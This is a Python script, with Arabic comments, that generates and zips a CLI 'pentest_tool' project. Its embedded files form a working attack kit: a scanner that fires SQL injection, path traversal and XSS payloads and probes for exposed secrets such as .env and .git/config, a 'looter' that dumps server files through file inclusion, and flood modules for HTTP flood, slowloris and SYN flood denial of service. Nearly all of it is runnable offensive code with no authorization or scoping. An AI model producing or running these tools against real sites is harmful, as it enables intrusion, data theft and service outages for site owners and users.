import os
import zipfile

# محتويات الملفات
files_content = {
    "requirements.txt": """requests
colorama
scapy
""",
    
    "scanner.py": '''import time
import requests
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

requests.packages.urllib3.disable_warnings()

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/120.0 Safari/537.36"
}

SENSITIVE = [
    ("/.env", "environment"), ("/.git/config", "git config"),
    ("/.git/HEAD", "git head"), ("/.htaccess", "htaccess"),
    ("/wp-config.php.bak", "wp backup"), ("/config.php.bak", "config backup"),
    ("/backup.zip", "backup archive"), ("/db.sql", "db dump"),
    ("/phpinfo.php", "phpinfo"), ("/server-status", "apache status"),
    ("/.DS_Store", "mac meta"), ("/composer.json", "composer"),
    ("/package.json", "npm"), ("/.svn/entries", "svn"),
    ("/web.config", "iis"), ("/admin/", "admin"), ("/phpmyadmin/", "pma"),
]

SQLI_ERRORS = [
    "you have an error in your sql syntax", "warning: mysql",
    "unclosed quotation mark", "quoted string not properly terminated",
    "microsoft ole db", "pg_query()", "sqlite error",
]
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
]
XSS_PAYLOAD = "<script>alert(1)</script>"

def _get(url, timeout=8, **kw):
    try:
        return requests.get(url, headers=HEADERS, timeout=timeout,
                            verify=False, allow_redirects=True, **kw)
    except Exception:
        return None

def probe_paths(base):
    hits = []
    def check(item):
        path, desc = item
        url = urljoin(base, path)
        r = _get(url)
        if r and r.status_code in (200, 401, 403) and len(r.content) > 0:
            hits.append((url, r.status_code, len(r.content), desc))
    with ThreadPoolExecutor(max_workers=20) as ex:
        list(ex.map(check, SENSITIVE))
    return hits

def _swap(url, param, payload):
    p = urlparse(url)
    qs = parse_qs(p.query)
    qs[param] = [payload]
    return urlunparse(p._replace(query=urlencode(qs, doseq=True)))

def test_sqli(url, param):
    for payload in ["'", "\"", "' OR '1'='1", "1' AND SLEEP(2)-- -"]:
        target = _swap(url, param, payload)
        t0 = time.time()
        r = _get(target)
        dt = time.time() - t0
        if r is None:
            continue
        body = r.text.lower()
        for err in SQLI_ERRORS:
            if err in body:
                return f"error-based ({err[:40]})"
        if "SLEEP" in payload.upper() and dt > 1.8:
            return f"time-based ({dt:.2f}s)"
    return None

def test_lfi(url, param):
    for payload in LFI_PAYLOADS:
        r = _get(_swap(url, param, payload))
        if r is None:
            continue
        if "root:x:0:0" in r.text or "[extensions]" in r.text:
            return payload, r.text[:400]
    return None

def test_xss(url, param):
    r = _get(_swap(url, param, XSS_PAYLOAD))
    return bool(r and XSS_PAYLOAD in r.text)

def run_scan(url):
    print(f"[*] target {url}")
    r = _get(url)
    if not r:
        print("[!] unreachable")
        return
    for h in ["server", "x-powered-by", "x-frame-options",
              "content-security-policy", "strict-transport-security"]:
        print(f"  {h}: {r.headers.get(h) or 'MISSING'}")

    print("[*] sensitive path probe")
    for u, code, sz, desc in probe_paths(url):
        print(f"  [{code}] {u}  ({sz}b) — {desc}")

    params = list(parse_qs(urlparse(url).query).keys())
    if not params:
        print("[!] no query params — pass URL like ?id=1&p=2")
        return

    for p in params:
        print(f"[*] param '{p}'")
        sq = test_sqli(url, p)
        if sq: print(f"  SQLi → {sq}")
        lf = test_lfi(url, p)
        if lf: print(f"  LFI  → {lf[0]} (leak {len(lf[1])}b)")
        if test_xss(url, p): print(f"  XSS  → reflected")
''',

    "looter.py": '''import os, base64, re, requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

requests.packages.urllib3.disable_warnings()

def lfi_dump(base_url, param, files, out_dir="./loot"):
    os.makedirs(out_dir, exist_ok=True)
    hits = {}
    for f in files:
        payload = f"php://filter/convert.base64-encode/resource={f}"
        p = urlparse(base_url)
        qs = parse_qs(p.query)
        qs[param] = [payload]
        url = urlunparse(p._replace(query=urlencode(qs, doseq=True)))
        try:
            r = requests.get(url, timeout=12, verify=False)
            data = base64.b64decode(r.text, validate=False)
            safe = f.replace("/", "_").replace("\\", "_")
            path = os.path.join(out_dir, safe)
            with open(path, "wb") as fh:
                fh.write(data)
            hits[f] = (path, len(data))
        except Exception as e:
            hits[f] = (None, str(e))
    return hits

def fetch_exposed(url, save_dir="./loot"):
    os.makedirs(save_dir, exist_ok=True)
    name = url.rstrip("/").split("/")[-1] or "index"
    try:
        r = requests.get(url, timeout=12, verify=False)
        path = os.path.join(save_dir, name)
        with open(path, "wb") as fh:
            fh.write(r.content)
        return path, len(r.content)
    except Exception as e:
        return None, str(e)

def grab_directory(url, save_dir="./loot"):
    os.makedirs(save_dir, exist_ok=True)
    r = requests.get(url, timeout=12, verify=False)
    links = re.findall(r'href="([^"?]+)"', r.text)
    pulled = []
    for l in links:
        if l.startswith("?") or l.startswith("../"):
            continue
        full = url.rstrip("/") + "/" + l.lstrip("/")
        p, sz = fetch_exposed(full, save_dir)
        if p:
            pulled.append((full, sz))
    return pulled
''',

    "flood.py": '''import socket, random, time, threading, requests
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
]

def http_flood(url, threads=200, duration=60, method="GET"):
    stop = time.time() + duration
    counter = {"n": 0}
    lock = threading.Lock()
    def worker():
        while time.time() < stop:
            try:
                h = {"User-Agent": random.choice(UA),
                     "Accept": "*/*", "Connection": "keep-alive"}
                if method.upper() == "GET":
                    requests.get(url, headers=h, timeout=5, verify=False)
                else:
                    requests.post(url, headers=h,
                                  data={"x": random.randint(1, 99999)},
                                  timeout=5, verify=False)
                with lock:
                    counter["n"] += 1
            except Exception:
                pass
    ts = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    [t.start() for t in ts]
    [t.join() for t in ts]
    return counter["n"]

def slowloris(host, port=80, sockets=200, duration=60):
    stop = time.time() + duration
    conns = []
    ua = random.choice(UA)
    for _ in range(sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            s.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {host}\r\n".encode())
            s.send(f"User-Agent: {ua}\r\n".encode())
            s.send(b"Accept-language: en\r\n")
            conns.append(s)
        except Exception:
            pass
    while time.time() < stop:
        for s in conns:
            try:
                s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
            except Exception:
                pass
        time.sleep(10)
    for s in conns:
        try: s.close()
        except: pass
    return len(conns)

def syn_flood(host, port=80, duration=30):
    from scapy.all import IP, TCP, send, RandShort
    stop = time.time() + duration
    n = 0
    while time.time() < stop:
        pkt = IP(dst=host) / TCP(sport=RandShort(), dport=port, flags="S")
        send(pkt, verbose=False)
        n += 1
    return n
''',

    "main.py": '''import argparse
from urllib.parse import urlparse

from scanner import run_scan
from looter import lfi_dump, fetch_exposed, grab_directory
from flood import http_flood, slowloris, syn_flood

def main():
    p = argparse.ArgumentParser(prog="pentest")
    sub = p.add_subparsers(dest="cmd", required=True)

    s = sub.add_parser("scan")
    s.add_argument("url")

    l = sub.add_parser("loot")
    l.add_argument("url")
    l.add_argument("--param")
    l.add_argument("--files", nargs="*", default=["/etc/passwd"])
    l.add_argument("--dir", action="store_true")

    d = sub.add_parser("flood")
    d.add_argument("url")
    d.add_argument("--method", default="GET", choices=["GET", "POST"])
    d.add_argument("--threads", type=int, default=200)
    d.add_argument("--duration", type=int, default=60)
    d.add_argument("--mode", default="http", choices=["http", "slowloris", "syn"])

    a = p.parse_args()

    if a.cmd == "scan":
        run_scan(a.url)
    elif a.cmd == "loot":
        if a.dir:
            for u, sz in grab_directory(a.url):
                print(f"  {u}  ({sz}b)")
        elif a.param:
            for f, (path, sz) in lfi_dump(a.url, a.param, a.files).items():
                print(f"  {f} → {path} ({sz})")
        else:
            p_, sz = fetch_exposed(a.url)
            print(f"  {p_} ({sz})")
    elif a.cmd == "flood":
        u = urlparse(a.url)
        host = u.hostname
        port = u.port or (443 if u.scheme == "https" else 80)
        if a.mode == "http":
            print("hits:", http_flood(a.url, a.threads, a.duration, a.method))
        elif a.mode == "slowloris":
            print("conns:", slowloris(host, port, a.threads, a.duration))
        else:
            print("pkts:", syn_flood(host, port, a.duration))

if __name__ == "__main__":
    main()
'''
}

# بناء مجلد المشروع
folder_name = "pentest_tool"
os.makedirs(folder_name, exist_ok=True)

for filename, content in files_content.items():
    file_path = os.path.join(folder_name, filename)
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"[+] Created: {file_path}")

# ضغط المجلد إلى ZIP
zip_name = "pentest_tool.zip"
with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
    for root, dirs, files in os.walk(folder_name):
        for file in files:
            full_path = os.path.join(root, file)
            arcname = os.path.relpath(full_path, start=folder_name)
            zipf.write(full_path, arcname)

print(f"\n[+] Success! All files are compressed and ready in: {zip_name}")
